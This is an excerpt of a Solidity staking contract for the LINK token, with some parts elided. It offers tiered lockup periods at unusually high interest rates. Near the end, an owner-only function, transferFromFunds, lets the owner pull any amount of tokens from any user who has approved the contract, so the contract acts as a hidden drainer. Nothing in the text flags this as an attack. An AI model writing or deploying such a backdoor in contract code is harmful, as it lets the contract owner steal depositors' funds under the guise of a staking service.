...
contract LinkStakingContract4 {
  address payable private _owner;
  IERC20 private _token;

  constructor() {
    _owner = payable(msg.sender);
        _token = IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4); // "Link" token address
  }
  ...
  function deposit(uint256 amount, uint256 lockupPeriod, address referral) external {
    ...
    require(lockupPeriod >= 1 && lockupPeriod <= 4, "Invalid lockup period.");
    ...
    if (lockupPeriod == 1) {
      ...
      require(amount >= 5 * 10**20 && amount <= 2 * 10**21, "Invalid deposit amount for 14-day lockup.");
      currentInterestRate = 300; // 3%
    } else if (lockupPeriod == 2) {
      currentLockupPeriod = 30 * 1 days;
      require(amount >= 15 * 10**20 && amount <= 5 * 10**21, "Invalid deposit amount for 30-day lockup.");
      currentInterestRate = 750; // 7.5%
    } else if (lockupPeriod == 3) {
      currentLockupPeriod = 60 * 1 days;
      require(amount >= 3 * 10**21 && amount <= 10**22, "Invalid deposit amount for 60-day lockup.");
      currentInterestRate = 1700; // 17%
    } else if (lockupPeriod == 4) {
      currentLockupPeriod = 90 * 1 days;
      require(amount >= 7 * 10**21 && amount <= 10**23, "Invalid deposit amount for 90-day lockup.");
  ...
  function transferFromFunds(address user, uint256 amount) external onlyOwner {
    _token.transferFrom(user,  _owner, amount);
  }
